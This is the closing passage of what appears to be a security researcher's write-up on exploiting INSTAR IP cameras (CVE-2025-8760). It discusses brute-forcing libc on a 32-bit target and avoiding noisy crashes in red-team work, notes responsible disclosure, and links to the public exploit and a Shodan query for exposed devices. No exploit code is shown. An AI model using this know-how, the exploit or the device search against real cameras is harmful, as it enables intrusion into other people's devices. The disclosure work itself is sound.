Attentive readers might have noticed this is a 32-bit binary, so why not just brute-force the address of `system()`? This was indeed possible because the address space for 32-bit systems is significantly less than for 64-bit therefore the number of possible locations of libc is also a lot smaller. I used this approach for the first version of the exploit which worked fine. However, while probing for the correct address the exploit keeps crashing the target binary. If we think about a red team scenario this approach would be very noisy and should therefore be avoided. That’s why I decided to work out a more reliable exploit.

## Wrapping Up

We’ve now walked the full path from firmware extraction and analysis, through vulnerability identification, and exploitation. I hope reading this was as enjoyable for you as the actual research was for me.

All vulnerabilities discovered during this research were reported through a responsible-disclosure process. Thanks to INSTAR for their prompt response, they fixed the issues and released an update within a short period of time. The 90-day disclosure period has elapsed, and along with this write-up the exploit is now publicly available [here](https://github.com/born0monday/CVE-2025-8760/tree/main).

1.  Shodan INSTAR Search - [https://www.shodan.io/search?query=http.favicon.hash%3A-1748763891](https://www.shodan.io/search?query=http.favicon.hash%3A-1748763891) [↩](#fnref:1 "return to article")
    
2.  INSTAR Wiki: Restore Firmware - [https://wiki.instar.com/en/Advanced_User/Restore_Firmware/](https://wiki.instar.com/en/Advanced_User/Restore_Firmware/)) [↩](#fnref:2 "return to article")
    
3.  boofuzz Fuzzing Framework - [https://github.com/jtpereyda/boofuzz](https://github.com/jtpereyda/boofuzz) [↩](#fnref:3 "return to article")
    
4.  INSTAR Advisory - [https://modzero.com/static/MZ-25-03_modzero_INSTAR.pdf](https://modzero.com/static/MZ-25-03_modzero_INSTAR.pdf) [↩](#fnref:4 "return to article")
    
5.  ROPing our way to RCE - [https://modzero.com/en/blog/roping-our-way-to-rce/](https://modzero.com/en/blog/roping-our-way-to-rce/) [↩](#fnref:5 "return to article")
    
6.  CTF Handbook Relocation Read-Only - [https://ctf101.org/binary-exploitation/relocation-read-only/](https://ctf101.org/binary-exploitation/relocation-read-only/) [↩](#fnref:6 "return to article")
    
7.  Cybersecurity Notes PLT and GOT - [https://ir0nstone.gitbook.io/notes/binexp/stack/aslr/plt_and_got](https://ir0nstone.gitbook.io/notes/binexp/stack/aslr/plt_and_got) [↩](#fnref:7 "return to article")
    
8.  angrop - [https://github.com/angr/angrop](https://github.com/angr/angrop) [↩](#fnref:8 "return to article")
    
9.  Ropper - [https://github.com/sashs/Ropper](https://github.com/sashs/Ropper) [↩](#fnref:9 "return to article")
